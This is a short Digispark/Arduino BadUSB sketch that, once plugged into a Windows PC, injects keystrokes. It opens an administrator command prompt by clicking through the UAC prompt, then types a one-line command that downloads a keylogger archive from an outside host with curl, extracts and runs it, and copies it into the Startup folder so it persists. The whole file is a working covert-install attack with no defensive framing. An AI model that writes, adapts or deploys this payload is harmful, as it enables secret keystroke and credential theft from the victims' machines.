#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); // LED on Model A
}

void cmd_2() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // LED on <--> Action start
  cmd_2(); // Open CMD in Administrator Privileges using METHOD 1 (UNCOMMENT TO USE)
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("cd C:\\Users\\%USERNAME% & curl -L -O https://github.com/marceloapd/keylogger/archive/main.zip & powershell Expand-Archive -Path .\\main.zip -DestinationPath .\\ -Force & cd keylogger-main & start cmd /c \"keylogger.bat & exit\" & move /Y ./keylogger.pyw \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"& exit");
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*Infinite loop to disconnect device*/ }
}
